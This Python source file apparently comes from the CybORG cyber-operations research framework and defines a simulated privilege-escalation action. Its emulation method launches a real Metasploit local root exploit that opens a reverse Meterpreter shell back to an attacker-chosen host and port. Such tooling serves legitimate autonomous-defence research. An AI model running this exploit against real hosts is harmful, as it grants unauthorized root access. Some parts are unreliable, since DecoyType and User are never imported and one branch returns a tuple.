# pylint: disable=invalid-name
from typing import Tuple
from ipaddress import IPv4Address
from random import choice, randint

from CybORG.Shared import Observation
from CybORG.Shared.Actions.MSFActionsFolder.MSFPrivilegeEscalationFolder.MSFPrivilegeEscalation import MSFPrivilegeEscalation
from CybORG.Shared.Enums import OperatingSystemType, SessionType
from CybORG.Simulator.Host import Host
from CybORG.Simulator.Process import Process
from CybORG.Simulator.State import State


class MSFSubUidShell(MSFPrivilegeEscalation):
    """
    Implements the SubUidShell permissions escalation action
    """
    def __init__(self, session: int, agent: str, ip_address: IPv4Address):
        super().__init__(session, agent)
        self.ip_address = ip_address

    def sim_execute(self, state: State) -> Observation:

        obs = Observation()
        # get details of the server session
        server_sessions = [ s for s in state.sessions[self.agent] if s.session_type == SessionType.MSF_SERVER ]
        if len(server_sessions) == 0:
            # no server session found
            return Observation(success=False)
        # choose first session
        session = server_sessions[0]

        # find shared subnet of the two hosts
        server_session, server_interface = self.get_local_source_interface(local_session=session, remote_address=self.ip_address, state=state)

        if server_interface is None:
            return Observation(success=False)

        server_address = server_interface.ip_address

        # implement equivalent of session handler within State object
        # sessions = state.get_sessions_by_remote_ip(self.ip_address)
        # find session on the chosen host
        hostname = state.ip_addresses[self.ip_address]

        sessions = [ s for s in state.sessions[self.agent] if s.ip_addr == self.ip_address ]
        if len(sessions) == 0:
            # no valid session could be found on chosen host
            return Observation(success=False)

        # find if any sessions are already priv
        priv_host_sessions = [ s for s in sessions if s.username in ('root','SYSTEM') ]
        if len(priv_host_sessions) > 0:
          # return first session
          obs.set_success(True)
          sess = priv_host_sessions[0]
          # should we also return the process information of this existing session??
          obs.add_session_info(hostid=hostname, **sess.get_state())
          return obs

        # choosing first session
        target_host_session = sessions[0]

        # what is the effect of the escalate sandbox?
        if target_host_session.is_escalate_sandbox:
               state.remove_process(target_host_session.host, target_host_session.pid)
               return Observation(success=False),

        # sim_escalate functionality here
        # target_hostname=hostname
        target_host = state.hosts[hostname]

        obs=Observation()

        # checks whether priv esc is possible
        is_compatible, necessary_processes = self.test_exploit_works(target_host)
        if not is_compatible:
            obs.set_success(False)
            return obs

        for proc in necessary_processes:
            if proc.decoy_type & DecoyType.ESCALATE:
                obs.set_success(False)
                return obs

        root_user: User = None
        if target_host.os_type == OperatingSystemType.LINUX:

            for u in target_host.users:
                if u.username == "root":
                    root_user = u

            if root_user is None:
                obs.set_success(False)
                return obs

        else:
            # not a linux server
            obs.set_success(False)
            return obs

        # Simulator State Changes
        # create process on the target state for the meterpreter client
        target_process = target_host.add_process(name="bash", ppid=1, path="/usr/bin/", user=root_user.username)


        # adds session to target host on the Simulator State
        # this adds the session.pid
        # is server_session the correct value for the parent on the target host?
        new_session = state.add_session(host=target_host.hostname, agent=self.agent, process=target_process.pid,
                                                user=root_user.username, session_type="meterpreter", parent=server_session)

        local_port = target_host.get_ephemeral_port()
        # get random reverse shell port
        lport = randint(4400,4500)
        new_connection = {"remote_port": local_port,
                                  "Application Protocol": "tcp",
                                  "remote_address": server_address,
                                  "local_port": lport,
                                  "local_address": str(self.ip_address)
                                  }
        state.hosts[new_session.host].get_process(new_session.pid).connections.append(new_connection)

        remote_port = {"remote_port": lport,
                               "Application Protocol": "tcp",
                               "local_address": server_address,
                               "remote_address": str(self.ip_address),
                               "local_port": local_port
                               }

        # adds connection to the target host 2on the server session
        state.hosts[server_session.host].get_process(server_session.pid).connections.append(remote_port)

        obs.add_process(hostid=hostname, local_address=str(self.ip_address), local_port=local_port, remote_address=server_address, remote_port=lport)
        obs.add_process(hostid=server_session.host, local_address=str(server_address), local_port=lport, remote_address=str(self.ip_address), remote_port=local_port)
        obs.add_session_info(hostid=hostname, username=new_session.username, session_id=new_session.ident, session_type=new_session.session_type, agent=self.agent)

        return obs

    def emu_execute(self, session_handler) -> Observation:
        obs = Observation()
        user = None
        from CybORG.Emulator.Session import MSFSessionHandler
        if type(session_handler) is not MSFSessionHandler:
            obs.set_success(False)
            return obs
        # get sessions for the target_host
        target_sessions = session_handler.get_session_by_remote_ip(str(self.ip_address), session_type="shell")
        if len(target_sessions) == 0:
            obs.set_success(False)
            return obs
        else:
          target_session = list(target_sessions.keys())[0]
          lhost = self.get_lhost(target_sessions[target_session]["tunnel_local"])
          lport = randint(4400,4500)

          output = session_handler.execute_module(mtype='exploit', 
                                         mname='linux/local/nested_namespace_idmap_limit_priv_esc',
                                         opts = { "SESSION": target_session },
                                         payload_name="linux/x86/meterpreter/reverse_tcp",
                                         payload_opts={'LHOST': lhost, 'LPORT': lport})
          obs.add_raw_obs(output)
          obs.set_success(False)
          session = None
          try:
            for line in output.split('\n'):
              if '[*] Meterpreter session' in line:
                obs.set_success(True)
                split = line.split(' ')
                session = int(split[3])
                if '-' in split[5]:
                    temp = split[5].replace('(', '').split(':')[0]
                    origin, rip = temp.split('-')
                    rport = None
                else:
                    rip, rport = split[5].replace('(', '').split(':')
                lip, lport = split[7].replace(')', '').split(':')
                obs.add_process(hostid=str(self.ip_address), local_address=lip, local_port=lport, remote_address=rip, remote_port=rport)
                # need to set up meterpreter reverse process on attacker
                obs.add_process(hostid=str(rip), local_address=rip, local_port=rport, remote_address=lip, remote_port=lport)
            user = session_handler.get_session_user(session)
            if user is None:
              obs = Observation()
              obs.set_success(False)
            else:
              obs.add_session_info(hostid=str(self.ip_address), username=user, session_id=session, session_type='meterpreter', agent=self.agent)
          except Exception as ex:
            session_handler._log_debug(f'Error occured in parsing of output: {output}')
            raise ex
        session_handler._log_debug(output)
        return obs

    def test_exploit_works(self, target_host: Host) -> Tuple[bool, Tuple[Process,...]]:
        # the exact patches and OS distributions are described here:
        # NOTE: doesn't implement any patch reference.
        # ie all linux hosts are exploitable
        # returns empty tuple necessary processes
        return target_host.os_type == OperatingSystemType.LINUX, ()

    def __str__(self):
        return f"{self.__class__.__name__} Target: {self.ip_address}"

